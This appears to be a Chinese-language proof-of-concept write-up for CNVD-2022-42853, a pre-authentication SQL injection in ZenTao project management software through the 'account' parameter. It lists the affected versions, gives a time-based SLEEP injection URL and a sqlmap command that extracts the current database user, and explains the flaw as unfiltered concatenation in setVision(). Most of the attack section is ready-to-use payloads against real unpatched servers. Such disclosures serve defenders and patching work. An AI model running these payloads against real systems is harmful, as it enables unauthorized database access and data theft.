## CNVD-2022-42853

禅道（ZenTaoPMS）受影响版本：  

    开源版：16.5，16.5beta1    
    企业版：6.5，6.5beta1    
    旗舰版：3.0，3.0beta1
    
## POC

**延时POC**:  
    
`http://ip:port/index.php?account=admin' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))a)-- b`

**SQLMap POC**:    
    
`python sqlmap.py -u http://ip:port/index.php?account=admin -p account --current-user `    

## 查看版本

① `http://ip:port/index.php?mode=getconfig`    
    
② 登录框看源码    

![image](https://user-images.githubusercontent.com/20917372/181399320-e98e0b71-8622-4f67-b61b-db491dfcb6fb.png)

## 漏洞成因

漏洞点出现在以上版本的**zbox\app\zentao\framework\base\router.class.php**文件里，具体函数为**setVision()**    
    
该函数未对外界传入的account参数做过滤直接拼接SQL语句，触发SQL注入漏洞    

![image](https://user-images.githubusercontent.com/20917372/181397275-32bdff31-305e-418f-badd-0d4670eb8a63.png)

从代码里可以看到，$account变量支持$_GET和$_POST两种方法传参，可前台SQLi

## 免责声明

漏洞披露时间已过CNVD公开日期，该项目仅对内部安全测试提供参考。对外渗透测试请取得授权进行，否则后果自负，与本项目无关。


